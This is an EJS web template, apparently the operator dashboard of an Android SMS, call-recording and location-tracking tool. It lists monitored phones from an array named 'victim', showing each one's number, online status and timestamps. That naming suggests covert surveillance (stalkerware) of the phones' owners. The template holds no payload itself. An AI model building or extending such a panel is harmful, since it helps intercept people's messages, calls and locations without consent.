<html lang="en">

<%- include header %>
<!-- Main component for a primary marketing message or call to action -->

<div class="container-fluid">

    <div class="row">
        <div class="col">
            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Phần mềm quản lý SMS, Call Recorder, Location Android</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Quản lý tin nhắn SMS, Call thuê bao sử dụng Android</h6>
                    <p class="card-text">Develop by NamBean</p>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col">
            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Danh sách thuê bao</h5>
                    <table class="table">
                        <thead>
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">Trạng thái</th>
                            <th scope="col">Thuê bao</th>
                            <th scope="col">Ngày tạo</th>
                            <th scope="col">Ngày cập nhật</th>
                            <th scope="col">Quản lý</th>
                        </tr>
                        </thead>
                        <tbody>
                        <%
                        for(var i=0; i < victim.length ; i++) { %>
                        <tr>
                            <th style=" width: 6%; " scope="row"><%= victim[i].id %></th>
                            <td style=" width: 6%; text-align: center;">
                                <%if (victim[i].status==0) {%>  <i class="fa fa-circle text-danger"></i>  <%}%>
                                <%if (victim[i].status==1) {%>  <i class="fa fa-circle text-success"></i>  <%}%>
                            </td>
                            <td><%= victim[i].sdt %></td>
                            <td><%= moment(victim[i].created_date).format( 'DD-MM-YYYY hh:mm:ss ')  %></td>
                            <td><%= moment(victim[i].update_date).format( 'DD-MM-YYYY hh:mm:ss ')  %></td>
                            <td><a class="btn btn-success">SMS / Call</a></td>
                        </tr>
                        <% } %>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

</div>
</div>
<%- include footer %>